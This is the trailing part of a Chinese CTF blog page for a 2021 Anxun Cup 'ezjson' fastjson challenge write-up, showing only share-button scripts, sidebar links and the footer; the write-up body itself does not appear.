+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://fmyyy.gitee.io/2021/12/02/2021%E5%AE%89%E6%B4%B5%E6%9D%AFezjson-wp/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://fmyyy.gitee.io/2021/12/02/2021%E5%AE%89%E6%B4%B5%E6%9D%AFezjson-wp/";
+            const title         = "「2021安洵杯ezjson-wp」";
+            const excerpt       = `ezjson比赛只做了前两道web，这道题没去看了，因为当时看做出来的人不多就去复习了，今天有空看一下题。
+fd文件可以泄露 jar文件下到源码。题目环境不出网没法jndi。但题目本身留了加载字节码后门。
+
+
+fastjson版本1....`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2021-12-02</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" fastjson反序列化 1.2.22-1.2.47" href="/2021/11/25/fastjson反序列化/">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/tou.jpg" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">这个ctfer好废物</p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjson"><span class="toc-text">ezjson</span></a></li></ol>
+    </div>
+</aside>
+                
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A1%86%E6%9E%B6/">框架</a><span class="category-list-count">1</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2021/12/02/2021%E5%AE%89%E6%B4%B5%E6%9D%AFezjson-wp/"><i class="fa  fa-book"></i> 2021安洵杯ezjson-wp</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/25/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa  fa-book"></i> fastjson反序列化 1.2.22-1.2.47</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/21/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web%E9%83%A8%E5%88%86wp/"><i class="fa  fa-book"></i> 2021西湖论剑web部分wp</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/21/java%20Filter%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa  fa-book"></i> java Filter内存马</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/19/jdk7u21/"><i class="fa  fa-book"></i> jdk7u21反序列化</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:254005846@qq.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2021 fmyyy 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
